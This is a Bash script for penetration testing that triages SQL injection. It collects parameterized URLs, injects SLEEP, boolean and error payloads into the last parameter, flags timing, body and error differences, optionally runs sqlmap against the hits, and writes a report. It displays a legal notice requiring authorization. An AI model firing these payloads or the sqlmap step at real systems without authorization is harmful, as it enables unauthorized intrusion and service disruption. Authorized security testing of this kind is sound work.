#!/usr/bin/env bash
# sqli_triage.sh — fast SQL-injection triage scanner.
#
# Pipeline:
#   1) collect URLs (gau / katana / user-supplied list)
#   2) keep only URLs with query parameters
#   3) for each, send: time-based + boolean-based + error-based probes
#   4) flag URLs whose response time spikes / body diff / error keywords
#   5) (optional) confirm with sqlmap --batch on flagged URLs
#
# Usage:
#   ./sqli_triage.sh https://target.lab               # scan one host
#   ./sqli_triage.sh -l urls.txt -o /tmp/sqli         # use a URL list
#   ./sqli_triage.sh https://target.lab --confirm     # also run sqlmap on hits
#   ./sqli_triage.sh https://target.lab --yes         # skip prompt
#
# Required: curl, jq, awk
# Recommended: gau, qsreplace, sqlmap (all in Kali repos: sudo apt install sqlmap; go install gau qsreplace)

set -uo pipefail

LEGAL_NOTICE='
================ LEGAL NOTICE ================
This tool sends SQL-injection probes that can disrupt services and may
trigger WAF blocks / alerts. Use only on:
  (a) systems you own,
  (b) targets under written authorization,
  (c) self-hosted labs (DVWA, sqli-labs, Juice Shop).
==============================================
'

TARGET=""; URLLIST=""; OUT=""; CONFIRM=0; YES=0
while [[ $# -gt 0 ]]; do
  case "$1" in
    -l|--list)    URLLIST="$2"; shift 2 ;;
    -o|--out)     OUT="$2"; shift 2 ;;
    --confirm)    CONFIRM=1; shift ;;
    --yes)        YES=1; shift ;;
    -h|--help)    sed -n '2,20p' "$0"; exit 0 ;;
    *)            TARGET="$1"; shift ;;
  esac
done

[[ -z "$TARGET" && -z "$URLLIST" ]] && { echo "Usage: $0 <target-url> | -l urls.txt"; exit 2; }
echo "$LEGAL_NOTICE"
if [[ $YES -ne 1 ]]; then read -rp "Proceed? (yes/N) " a; [[ "$a" != yes ]] && exit 1; fi

OUT="${OUT:-./sqli_$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUT"
URLS="$OUT/urls.txt"
PARAMS="$OUT/params.txt"
HITS="$OUT/triage_hits.txt"
REPORT="$OUT/report.md"

have(){ command -v "$1" >/dev/null 2>&1; }

# ---- 1. URL collection ------------------------------------------------
if [[ -n "$URLLIST" ]]; then
  cp "$URLLIST" "$URLS"
elif have gau; then
  echo "[*] gau on $TARGET ..."
  echo "$TARGET" | gau --threads 5 2>/dev/null | sort -u > "$URLS"
else
  echo "$TARGET" > "$URLS"
fi
NURL=$(wc -l < "$URLS")
echo "    -> $NURL URLs"

# ---- 2. Filter to URLs with parameters --------------------------------
grep -E '\?[a-zA-Z0-9_]+=.+' "$URLS" | sort -u > "$PARAMS"
NPARAM=$(wc -l < "$PARAMS")
echo "    -> $NPARAM URLs with query parameters"

# ---- 3. Probe -- three quick payload classes --------------------------
# We modify the LAST value in the query string with a known payload and look
# for: response time spike (time-based), body diff (boolean), and error keywords.

echo "[*] Triaging ..."
> "$HITS"

# Error keywords commonly emitted by SQL drivers
ERR_KEYWORDS='you have an error in your sql syntax|warning.*mysql|unclosed quotation mark|microsoft ole db provider|odbc.*error|sqlstate|psqlexception|sqlite.*error|ora-[0-9]{4,5}'

probe_one() {
  local u="$1"
  # extract last param=value, build mutated URL
  local prefix="${u%=*}="
  local origval="${u##*=}"
  local sleeppayload='1)) OR (SELECT(SLEEP(3)))-- -'
  local boolt='1 OR 1=1-- -'
  local boolf='1 AND 1=2-- -'
  local errp="1'\""

  # baseline timing
  local t0=$(date +%s%N)
  local r0=$(curl -sk --max-time 8 -o /dev/null -w "%{http_code}\n%{size_download}" "$u" 2>/dev/null)
  local t1=$(date +%s%N)
  local base_ms=$(( (t1-t0)/1000000 ))

  # time-based
  t0=$(date +%s%N)
  curl -sk --max-time 12 -o /dev/null "${prefix}${sleeppayload}" >/dev/null 2>&1
  t1=$(date +%s%N)
  local sleep_ms=$(( (t1-t0)/1000000 ))

  # boolean true / false
  local true_body=$(curl -sk --max-time 8 "${prefix}${boolt}" 2>/dev/null | wc -c)
  local false_body=$(curl -sk --max-time 8 "${prefix}${boolf}" 2>/dev/null | wc -c)

  # error
  local err_body=$(curl -sk --max-time 8 "${prefix}${errp}" 2>/dev/null)

  local flags=""
  # Threshold: sleep payload should add ~3000ms vs baseline
  if (( sleep_ms - base_ms > 2500 )); then flags+="TIME(${sleep_ms}ms vs ${base_ms}ms) "; fi
  # Boolean: bodies should differ significantly
  if (( true_body > 0 && false_body > 0 )); then
    local diff=$(( true_body > false_body ? true_body - false_body : false_body - true_body ))
    if (( diff > 50 && diff > true_body / 20 )); then
      flags+="BOOL(Δ${diff}b) "
    fi
  fi
  # Error
  if echo "$err_body" | grep -qiE "$ERR_KEYWORDS"; then
    flags+="ERR "
  fi

  if [[ -n "$flags" ]]; then
    echo "$flags| $u" >> "$HITS"
    echo "  [HIT] $flags  $u"
  fi
}

# Iterate, but cap for sanity
head -200 "$PARAMS" | while read -r u; do
  probe_one "$u"
done
NHIT=$(wc -l < "$HITS")
echo "    -> $NHIT triage hits"

# ---- 4. Optional sqlmap confirmation ----------------------------------
if [[ $CONFIRM -eq 1 && $NHIT -gt 0 ]] && have sqlmap; then
  echo "[*] sqlmap confirmation on hits ..."
  while IFS='|' read -r flags u; do
    u=$(echo "$u" | xargs)
    safe_name=$(echo "$u" | tr -c 'a-zA-Z0-9' '_' | cut -c1-80)
    sqlmap -u "$u" --batch --random-agent --level 2 --risk 1 --time-sec 5 \
      --output-dir="$OUT/sqlmap" >> "$OUT/sqlmap_${safe_name}.log" 2>&1 || true
  done < "$HITS"
fi

# ---- 5. Report --------------------------------------------------------
{
  echo "# SQLi Triage Report"
  echo
  echo "_Generated: $(date -u '+%Y-%m-%dT%H:%M:%SZ')_"
  echo
  echo "## Summary"
  echo
  echo "| Metric | Count |"
  echo "|--------|-------|"
  echo "| URLs collected | $NURL |"
  echo "| URLs with parameters | $NPARAM |"
  echo "| Triage hits | $NHIT |"
  echo
  echo "## Hits"
  echo
  echo "Flag legend: \`TIME\` = time-based delay; \`BOOL\` = body-size diff under true/false payloads; \`ERR\` = SQL error keyword in response."
  echo
  if [[ -s "$HITS" ]]; then
    echo '```'
    cat "$HITS"
    echo '```'
  else
    echo "_(no triage hits — either clean or WAF blocking)_"
  fi
  echo
  echo "## Recommended next steps for hits"
  echo
  echo "1. **Manually verify in Burp Repeater** — automation false-positives are common, especially BOOL on dynamic content."
  echo "2. Identify DBMS via banner / error / payload variant."
  echo "3. Run sqlmap with appropriate \`--dbms\` and elevated \`--level\`/\`--risk\` only after verification."
  echo "4. Document the parameter, payload, response in your finding template."
  echo
  if [[ $CONFIRM -eq 1 ]]; then
    echo "_sqlmap logs in $OUT/sqlmap_*.log_"
  fi
  echo
  echo "---"
  echo
  echo "_Triage hits ≠ confirmed vulnerabilities. Always manually verify._"
} > "$REPORT"

echo
echo "[+] Done."
echo "    Report: $REPORT"
echo "    Hits  : $NHIT"
